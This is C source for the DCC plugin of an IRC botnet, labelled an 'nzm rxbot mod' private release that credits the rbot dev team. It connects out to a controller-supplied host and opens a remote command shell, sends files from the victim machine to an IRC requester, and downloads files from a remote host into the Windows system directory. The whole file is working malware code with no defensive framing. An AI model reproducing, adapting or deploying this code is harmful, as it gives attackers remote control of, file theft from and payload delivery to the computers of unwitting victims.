/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_DCC

SOCKET CreateSock(char *host, int port)
{
	SOCKET ssock;
	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return INVALID_SOCKET;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);

	IN_ADDR in;
	in.s_addr = finet_addr(host);
	LPHOSTENT Hostent = NULL;
	if (in.s_addr == INADDR_NONE)
		Hostent = fgethostbyname(host); //hostname
	if (Hostent == NULL && in.s_addr == INADDR_NONE)  //error dns
		return INVALID_SOCKET;
	if (Hostent != NULL)
		ssin.sin_addr = *((LPIN_ADDR)*Hostent->h_addr_list); //hostname
	else
		ssin.sin_addr = in; //ip address

	if (fconnect(ssock, (LPSOCKADDR) &ssin, sizeof(ssin)) == SOCKET_ERROR) {
		fclosesocket(ssock);
		return INVALID_SOCKET;
	}

	return (ssock);
}

DWORD WINAPI DCCChatThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char buffer[4096];

	SOCKET ssock;
	if ((ssock = CreateSock(dcc.host,dcc.port)) == INVALID_SOCKET) {
		sprintf(buffer,"nzm (dcc.plg) »»  Failed to open socket.");
		if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
		addlog(buffer);

		clearthread(dcc.threadnum);

		ExitThread(1);
	}
	if (open_cmd(ssock,"") == -1) {
		sprintf(buffer,"nzm (dcc.plg) »»  Failed to open remote command shell.");
		if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
		addlog(buffer);

		fclosesocket(ssock);
		clearthread(dcc.threadnum);

		ExitThread(1);
	}
	Sleep(100);

	while (1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(ssock, buffer, sizeof(buffer), 0) <= 0)
			break;

		strcat(buffer,"\n");
		if (!send_commands(buffer))
			break;

		Sleep(100);
		if (findthreadid(RCMD_THREAD) == 0)
			break;
	}
	sprintf(buffer,"nzm (dcc.plg) »»  Failed to send to Remote command shell.");
	if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
	addlog(buffer);

	fclosesocket(ssock);
	clearthread(dcc.threadnum);

	ExitThread(0);
}


DWORD WINAPI DCCSendThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char sendbuf[IRCLINE],buffer[1024],tmpfile[MAX_PATH];

	int Fsend, bytes_sent;
	unsigned int move;
	unsigned __int64 totalbytes = 0;

	DWORD mode = 0;

	SOCKET ssock;
	while (1) {
		if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      		sprintf(sendbuf,"nzm (dcc.plg) »»  Failed to create socket.");
			break;
		}

		SOCKADDR_IN csin, ssin;
		memset(&ssin, 0, sizeof(ssin));
   		ssin.sin_family = AF_INET;
   		ssin.sin_port = fhtons(0);//random port
		ssin.sin_addr.s_addr = INADDR_ANY;

		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != 0) {
			sprintf(sendbuf,"nzm (dcc.plg) »»  Failed to bind to socket.");
			break;
		}
		int ssin_len = sizeof(ssin);
		fgetsockname(ssock, (LPSOCKADDR)&ssin, &ssin_len);

		unsigned short portnum = fntohs(ssin.sin_port);
		for (unsigned int i=0;i <= strlen(dcc.filename); i++)
			tmpfile[i] = ((dcc.filename[i] == 32)?(95):(dcc.filename[i]));

		if (flisten(ssock, 1) != 0) {
			sprintf(sendbuf,"nzm (dcc.plg) »»  Failed to open socket.");
			break;
		}
		HANDLE testfile = CreateFile(dcc.filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"nzm (dcc.plg) »»  File doesn't exist.");
			break;
		}

		int length = GetFileSize(testfile,NULL);
		sprintf(sendbuf,"DCC SEND %s %i %i %i",dcc.filename,fhtonl(finet_addr(GetIP(dcc.sock))),portnum,length);
		irc_privmsg(dcc.sock,dcc.sendto,sendbuf,FALSE);

		TIMEVAL timeout;
    	timeout.tv_sec = 60;//timeout after 60 sec.
    	timeout.tv_usec = 0;
		fd_set fd_struct;
		FD_ZERO(&fd_struct);
    	FD_SET(ssock, &fd_struct);

		if (fselect(0, &fd_struct, NULL, NULL, &timeout) <= 0) {
			irc_privmsg(dcc.sock,dcc.sendto,"nzm (dcc.plg) »»  Send timeout.",dcc.notice);
			break;
		}
		int csin_len = sizeof(csin);
		if ((dcc.csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len)) == INVALID_SOCKET)  {
			sprintf(sendbuf,"nzm (dcc.plg) »»  Unable to open socket.");
			break;
		}
		fclosesocket(ssock);

		while (length) {
			Fsend = 1024;
			if (Fsend>length)
				Fsend=length;
			move = 0-length;

			memset(buffer,0,sizeof(buffer));
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);

			bytes_sent = fsend(dcc.csock, buffer, Fsend, 0);
			totalbytes += bytes_sent;

			if (frecv(dcc.csock,buffer ,sizeof(buffer), 0) < 1 || bytes_sent < 1) {
				irc_privmsg(dcc.sock,dcc.sendto,"nzm (dcc.plg) »»  Socket error.",dcc.notice);
				addlog("nzm (dcc.plg) »»  Socket error.");

				fclosesocket(dcc.csock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
			length = length - bytes_sent;
		}
		if (testfile != INVALID_HANDLE_VALUE)
			CloseHandle(testfile);
		sprintf(sendbuf,"nzm (dcc.plg) »»  Transfer complete to IP: %s, Filename: %s (%s bytes).",finet_ntoa(csin.sin_addr),dcc.filename,commaI64(totalbytes));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (ssock > 0)
		fclosesocket(ssock);
	fclosesocket(dcc.csock);
	clearthread(dcc.threadnum);

	ExitThread(0);
}

DWORD WINAPI DCCGetThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char sendbuf[IRCLINE],buffer[4096],tmpfile[MAX_PATH];;

	int received = 0;
	unsigned long received2;

	FILE *infile;

	SOCKET ssock;

	GetSystemDirectory(tmpfile, sizeof(tmpfile));
	sprintf(tmpfile,"%s%s",tmpfile,dcc.filename);

	while (1) {
		HANDLE testfile = CreateFile(tmpfile,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"nzm (dcc.plg) »»  Error unable to write file to disk.");
			break;
		}
		CloseHandle(testfile);

		if ((infile = fopen(tmpfile,"a+b")) == NULL) {
			sprintf(sendbuf,"nzm (dcc.plg) »»  Error opening file for writing.");
			break;
		}

		if ((ssock = CreateSock(dcc.host,dcc.port)) == INVALID_SOCKET) {
			sprintf(sendbuf,"nzm (dcc.plg) »»  Error opening socket.");
			break;
		}
		DWORD err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));

			err = frecv(ssock, buffer, sizeof(buffer), 0);
			if (err == 0)
				break;
			if (err == SOCKET_ERROR) {
				sprintf(sendbuf,"nzm (dcc.plg) »»  Socket error.");
				irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
				addlog(sendbuf);

				fclose(infile);
				fclosesocket(ssock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}

			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  fhtonl(received);
			fsend(ssock,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuf,"nzm (dcc.plg) »»  Transfer complete from IP: %s, Filename: %s (%s bytes).",dcc.host,dcc.filename,commaI64(received));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (infile != NULL)
		fclose(infile);
	if (ssock > 0)
		fclosesocket(ssock);
	clearthread(dcc.threadnum);

	ExitThread(0);
}
#endif